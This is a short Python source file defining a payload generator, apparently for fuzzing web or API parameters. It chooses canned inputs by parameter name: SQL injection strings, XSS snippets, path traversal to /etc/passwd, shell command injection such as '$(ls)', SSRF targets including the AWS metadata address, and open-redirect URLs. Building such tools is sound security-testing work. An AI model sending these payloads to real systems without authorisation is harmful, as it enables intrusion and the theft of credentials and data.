import random
import string

class PayloadGenerator:
    def __init__(self):
        self.sql_injection = ["'", "''", "1' OR '1'='1", "1' UNION SELECT NULL--"]
        self.xss = ["<script>alert(1)</script>", "javascript:alert(1)", "<img src=x onerror=alert(1)>"]
        self.path_traversal = ["..", "../", "..\\", "../../../../../etc/passwd"]
        self.command_injection = ["; ls", "| ls", "`ls`", "$(ls)"]
        self.ssrf = ["http://127.0.0.1", "http://localhost", "http://169.254.169.254/latest/meta-data/"] # Metadata de AWS
        self.open_redirect = ["https://google.com", "///google.com"]

    def _get_base_payloads(self, data_type: str) -> list:
        payloads = [None, ""]
        if data_type == 'string':
            payloads.extend(["A" * 100, "A" * 10000])
        elif data_type == 'integer':
            payloads.extend([-1, 0, 999999999])
        return payloads

    def generate(self, param_name: str, data_type: str) -> list:
        payloads = self._get_base_payloads(data_type)
        param_name_lower = param_name.lower()

        # By parameter names
        if any(keyword in param_name_lower for keyword in ['id', 'user', 'account']):
            payloads.extend(self.sql_injection)
            payloads.append("../../../etc/passwd") # IDOR/Path Traversal

        if any(keyword in param_name_lower for keyword in ['redirect', 'url', 'next', 'return']):
            payloads.extend(self.open_redirect)
            payloads.extend(self.ssrf)

        if any(keyword in param_name_lower for keyword in ['query', 'search', 'filter', 'sort']):
            payloads.extend(self.sql_injection)
            payloads.extend(self.command_injection)

        if any(keyword in param_name_lower for keyword in ['file', 'path', 'folder']):
            payloads.extend(self.path_traversal)

        if data_type == 'string':
            payloads.extend(self.xss)
            payloads.extend(self.sql_injection)
        
        return list(set(payloads)) # delte duplicates